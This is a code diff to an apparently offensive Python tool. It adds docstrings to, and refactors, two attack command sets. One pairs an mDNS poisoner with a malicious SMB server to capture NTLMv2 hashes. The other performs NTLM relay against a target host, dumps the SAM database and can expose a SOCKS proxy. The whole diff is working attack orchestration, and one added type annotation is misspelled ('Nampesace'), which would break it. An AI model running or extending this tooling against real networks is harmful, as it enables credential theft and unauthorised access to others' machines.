@@ -42,20 +42,24 @@ class SmbServerAttack(CommandSet):
         self.__path_file = os.getcwd()
 
     def __configure_alerts_thread(self):
-        self.__alerts_hunter = Thread(target=self.__display_alerts)
+        """[ Method to configure the thread that shows alerts ]"""
+        self.__alerts_hunter = Thread(target=self.__display_ntlmv2)
         self.__alerts_hunter.dameon = True
         self.__alerts_hunter.start()
 
     def __check_directory(self) -> bool:
+        """[ Method to check if a directory exists ]"""
         return os.path.isdir(self.__path_file) and os.access(
             self.__path_file, os.X_OK | os.W_OK
         )  # Executing and wirte
 
     def __define_alerts(self):
+        """[ Method to define the dictionary that triggers the alerts ]"""
         self.__alerts_dictionary["new_ntlmv2"] = 0
         self.__alerts_dictionary["stop"] = 0
 
     def __ends_process_in_the_background(self):
+        """[ Method to stop the attack by the user ]"""
         if self.__attack is not None and self.__attack.is_alive:
             self._cmd.info_logger.success("Finishing mss attack in the background ...")
             self.__attack.terminate()
@@ -69,24 +73,24 @@ class SmbServerAttack(CommandSet):
             self._cmd.error_logger.error("There is not mss process in the background")
 
     def __async_options(self):
+        """[ Configuration in case of an asynchronous attack ]"""
         sys.stdout = open("/dev/null", "w")
         self.__mdns_poisoner.logger_level = "DEBUG"
         signal.signal(signal.SIGINT, signal.SIG_IGN)
 
     def __display_ntlmv2(self):
-        if self.__alerts_dictionary["new_ntlmv2"] == 1:
-            if self._cmd.terminal_lock.acquire(blocking=False):
-                self._cmd.async_alert(
-                    f"{LogSymbols.INFO.value} New ntlmv2 hash has been discovered. Saved in {self.__path_file}"
-                )
-                self._cmd.terminal_lock.release()
-            self.__alerts_dictionary["new_ntlmv2"] = 0
-
-    def __display_alerts(self):
+        """[ Method to show an alert in case of finding a new hash ]"""
         while self.__alerts_dictionary["stop"] == 0:
-            self.__display_ntlmv2()
+            if self.__alerts_dictionary["new_ntlmv2"] == 1:
+                if self._cmd.terminal_lock.acquire(blocking=False):
+                    self._cmd.async_alert(
+                        f"{LogSymbols.INFO.value} New ntlmv2 hash has been discovered. Saved in {self.__path_file}"
+                    )
+                    self._cmd.terminal_lock.release()
+                self.__alerts_dictionary["new_ntlmv2"] = 0
 
     def __components_to_launch(self):
+        """[ Method to launch the poisoner and malicious smb server ]"""
         mdns_thread = Thread(target=self.__mdns_poisoner.start_mdns_poisoning)
         mdns_thread.daemon = True
         mdns_thread.start()
@@ -94,11 +98,13 @@ class SmbServerAttack(CommandSet):
         self.__smbserver.start_malicious_smbserver()
 
     def __launch_necessary_components(self, args: argparse.Namespace) -> None:
+        """[ Method to launch the components necessary for the attack ]"""
         if args.Asynchronous:
             self.__async_options()
         self.__components_to_launch()
 
     def __synchronous_attack(self):
+        """[ Method to launch the synchronous attack ]"""
         try:
             # If ctrl+c then the process terminate and smb_relay exits
             self.__attack.join()
@@ -109,6 +115,10 @@ class SmbServerAttack(CommandSet):
             self._cmd.error_logger.warning("Exiting smb relay attack ...")
 
     def __launching_attack(self, args: argparse.Namespace) -> None:
+        """[ Method to launch the attack ]
+        Args:
+            args (argparse.Namespace): [ Arguments passed to the attack ]
+        """
         self.__attack = Process(target=self.__launch_necessary_components, args=(args,))
         self.__attack.start()
         self._cmd.info_logger.info(
@@ -119,6 +129,11 @@ class SmbServerAttack(CommandSet):
             self.__synchronous_attack()
 
     def __creating_components(self, args: argparse.Namespace) -> None:
+        """[ Method to create the necessary classes ]
+        Args:
+            args (argparse.Namespace): [ Arguments passed to the attack ]
+
+        """
         self.__mdns_poisoner = MDNS(
             self._cmd.LHOST,
             self._cmd.IPV6,
@@ -127,7 +142,6 @@ class SmbServerAttack(CommandSet):
             self._cmd.info_logger,
         )
 
-        # output in case of -SS command
         self.__smbserver = MaliciousSmbServer(
             self._cmd.LHOST,
             self._cmd.LPORT,
@@ -139,6 +153,11 @@ class SmbServerAttack(CommandSet):
         )
 
     def __checking_conditions_for_attack(self, args: argparse.Namespace) -> bool:
+        """[ Method to check attack options
+
+           Args:
+                args (argparse.Namespace): [ Arguments passed to the attack ]
+        ]"""
         if args.end_attack:
             self.__ends_process_in_the_background()
             return
@@ -218,6 +237,7 @@ class SmbServerAttack(CommandSet):
             self.__launching_attack(args)
 
     def mss_postloop(self) -> None:
+        """[ Metodo para detener el ataque antes de que se cierre la aplicacion ]"""
         if self.__attack is not None and self.__attack.is_alive:
             self.__attack.terminate()
             self.__attack.join()
@@ -228,6 +248,8 @@ class SmbServerAttack(CommandSet):
 
 @with_default_category("Man in the middle attacks")
 class NtlmRelay(CommandSet):
+    """[Class containing the ntlm relay attack]"""
+
     def __init__(self):
         super().__init__()
         self.__mdns_poisoner = None
@@ -246,16 +268,20 @@ class NtlmRelay(CommandSet):
         self.__config = None
 
     def __define_alerts(self):
+        """[ Method to define the alert trigger dictionary ]"""
         self.__alerts_dictionary["sam_dump"] = 0
         self.__alerts_dictionary["new_connection"] = 0
         self.__alerts_dictionary["stop"] = 0
 
     def __configure_alert_thread(self):
+
+        """[ Method to configure the thread that displays alerts ]"""
         self.__alerts_hunter = Thread(target=self.__display_alerts)
         self.__alerts_hunter.dameon = True
         self.__alerts_hunter.start()
 
     def __display_sam_alert(self):
+        """[ Method that displays a message if the sam has been dumped ]"""
         if self.__alerts_dictionary["sam_dump"] == 1:
             if self._cmd.terminal_lock.acquire(blocking=False):
                 self._cmd.async_alert(
@@ -269,6 +295,7 @@ class NtlmRelay(CommandSet):
             self.__alerts_dictionary["sam_dump"] = 0
 
     def __display_connection_alert(self):
+        """[ Method that displays a message if a new connection has been found ]"""
         if self.__alerts_dictionary["new_connection"] == 1:
             if self._cmd.terminal_lock.acquire(blocking=False):
                 self._cmd.async_alert(
@@ -281,18 +308,20 @@ class NtlmRelay(CommandSet):
 
             self.__alerts_dictionary["new_connection"] = 0
 
-    def __display_alerts(self):
-        while True and self.__alerts_dictionary["stop"] != 1:
+    def __display_alerts(self) -> None:
+
+        """[ Method that will be checking if the attack is over to finish the thread that shows the alerts ]"""
+        while self.__alerts_dictionary["stop"] != 1:
             self.__display_sam_alert()
             self.__display_connection_alert()
 
-    def __launch_necessary_components(self, args: argparse.Namespace) -> None:
-        """[ Function to launch the threads that will control the mdns poisoner and the smb server]
+    def __checking_directory_options(self, args: argparse.Nampesace) -> None:
+        """[Method that will check the options of the output]
 
         Args:
-            mdns_poisoner (MDNS): [ variable with the mdns poisoner Object ]
-            smbserver (SmbServer): [ variable with the SmbServer Object ]
+            args (argparse.Namespace): [ Arguments passed to the attack ]
         """
+
         if not self.__check_directory():
             self._cmd.error_logger.warning(
                 "The specified directory does not exists or you don't have access"
@@ -303,24 +332,56 @@ class NtlmRelay(CommandSet):
             move_sam_result.daemon = True
             move_sam_result.start()
 
+    def __checking_asynchronous_options(self, args: argparse.Namespace) -> None:
+        """[Method that will check the options of the asynchronnous attack]
+
+        Args:
+            args (argparse.Namespace): [ Arguments passed to the attack ]
+        """
+
         if args.Asynchronous:
             sys.stdout = open("/dev/null", "w")
+            self.__mdns_poisoner.logger_level = "DEBUG"
+            signal.signal(signal.SIGINT, signal.SIG_IGN)
+
+    def __checking_proxy_options(self, args: argparse.Namespace) -> None:
+        """[Method that will check the options of the proxy]
+
+        Args:
+            args (argparse.Namespace): [ Arguments passed to the attack ]
+        """
 
         if args.proxy:
             proxy_server = Proxy(self._cmd.info_logger)
             sock_server = proxy_server.server
             self.__config.setRunSocks(True, sock_server)
 
-        if args.Asynchronous:
-            self.__mdns_poisoner.logger_level = "DEBUG"
-            signal.signal(signal.SIGINT, signal.SIG_IGN)
+    def __checking_attack_options(self, args: argparse.Namespace) -> None:
+        """[Method that will check the options of the attack]
+
+        Args:
+            args (argparse.Namespace): [ Arguments passed to the attack ]
+        """
+
+        self.__checking_directory_options(args)
+        self.__checking_asynchronous_options(args)
+        self.__checking_proxy_options(args)
+
+    def __launch_necessary_components(self, args: argparse.Namespace) -> None:
+        """[ Method that check options of the attack and  launch the threads that will control the mdns poisoner and the smb server ]
+
+        Args:
+            args (argparse.Namespace): [ Arguments passed to the attack ]
+        """
+
+        self.__checking_attack_options(args)
         mdns_thread = Thread(target=self.__mdns_poisoner.start_mdns_poisoning)
         mdns_thread.daemon = True
-
         mdns_thread.start()
         self.__smb_relay_server.start_smb_relay_server()
 
     def __synchronous_attack(self):
+        """[ Method to perform the attack synchronously ]"""
         try:
             self.__ntlm_relay_process.join()
         except KeyboardInterrupt:
@@ -329,12 +390,8 @@ class NtlmRelay(CommandSet):
             self.__ntlm_relay_process = None
             self._cmd.error_logger.warning("Exiting smb relay attack ...")
 
-    def __asynchronous_attack(self) -> None:
-        self._cmd.info_logger.info(
-            f"Running ntlm relay on the background the results will be saved at: {self.__ouput_sam_dir}/{self.__output_sam_file} "
-        )
-
-    def __configure_ntlm_relay_attack(self):
+    def __configure_ntlm_relay_attack(self) -> None:
+        """[ Method to configure the class NTLMRelayxConfig ]"""
         target = TargetsProcessor(
             singleTarget=self._cmd.RHOST,
             protocolClients=self.__clients,
@@ -348,6 +405,7 @@ class NtlmRelay(CommandSet):
         self.__config.interfaceIp = self._cmd.LHOST
 
     def __store_sam_results_of_target(self) -> None:
+        """[method to save the attack output to a file]"""
         while True:
             try:
                 os.rename(
@@ -366,6 +424,7 @@ class NtlmRelay(CommandSet):
                 pass
 
     def __file_exits(self) -> bool:
+        """[ method to check if a file exists to check its overwriting ]"""
         exit = True
         if os.path.exists(self.__output_sam_dir + "/" + self.__output_sam_file):
             self._cmd.error_logger.warning(
@@ -380,11 +439,18 @@ class NtlmRelay(CommandSet):
         return exit
 
     def __check_directory(self) -> bool:
+        """[ Method to check if a directory exists ]"""
         return os.path.isdir(self.__output_sam_dir) and os.access(
             self.__output_sam_dir, os.X_OK | os.W_OK
         )  # Executing and wirte
 
-    def __checking_ending_options(self, args: argparse.Namespace):
+    def __checking_ending_options(self, args: argparse.Namespace) -> bool:
+        """[Method to set options when ending the attack]
+
+        Args:
+              args (argparse.Namespace): [ Arguments passed to the attack ]
+
+        """
         if args.end_attack:
             self.__ends_ntlm_relay()
             return False
@@ -396,7 +462,12 @@ class NtlmRelay(CommandSet):
         return True
 
     def __checking_conditions_for_attack(self, args: argparse.Namespace) -> bool:
+        """[ Method to check the actions taken during the attack ]
 
+        Args:
+            args (argparse.Namespace): [ Arguments passed to the attack ]
+
+        """
         if args.show_connections:
             self.__show_connections()
             return False
@@ -418,6 +489,13 @@ class NtlmRelay(CommandSet):
         return True
 
     def __creating_components(self, args: argparse.Namespace) -> None:
+        """[ Method to configure the classes to use ]
+
+        Args:
+            args (argparse.Namespace): [ Arguments passed to the attack ]
+
+        """
+
         self.__mdns_poisoner = MDNS(
             self._cmd.LHOST,
             self._cmd.IPV6,
@@ -436,6 +514,11 @@ class NtlmRelay(CommandSet):
         )
 
     def __launching_attack(self, args: argparse.Namespace) -> None:
+        """[ Method to launch the attack
+            Args:
+                args (argparse.Namespace): [ Arguments passed to the attack ]
+
+        ]"""
         self.__ntlm_relay_process = Process(
             target=self.__launch_necessary_components, args=(args,)
         )
@@ -443,9 +526,12 @@ class NtlmRelay(CommandSet):
         if not args.Asynchronous:
             self.__synchronous_attack()
         else:
-            self.__asynchronous_attack()
+            self._cmd.info_logger.info(
+                f"Running ntlm relay in the background the results will be saved at: {self.__ouput_sam_dir}/{self.__output_sam_file} "
+            )
 
     def __show_connections(self) -> None:
+        """[ Method to display captured connections ]"""
         if self.__ntlm_relay_process is not None:
             url = "http://192.168.253.135:9090/ntlmrelayx/api/v1.0/relays"
             try:
@@ -460,6 +546,7 @@ class NtlmRelay(CommandSet):
             self._cmd.error_logger.error("The ntlm_relay process is not activated")
 
     def __ends_ntlm_relay(self) -> None:
+        """[ Method to terminate the attack by the user ]"""
         if self.__ntlm_relay_process is not None and self.__ntlm_relay_process.is_alive:
             self._cmd.info_logger.success(
                 "Finishing ntlm relay attack in the background ..."
@@ -479,6 +566,7 @@ class NtlmRelay(CommandSet):
             )
 
     def ntlm_relay_postloop(self) -> None:
+        """[ Method to stop the attack before the application closes ]"""
         if self.__ntlm_relay_process is not None and self.__ntlm_relay_process.is_alive:
             self._cmd.info_logger.debug("Finishing ntlm_relay process ...")
             self.__ntlm_relay_process.terminate()
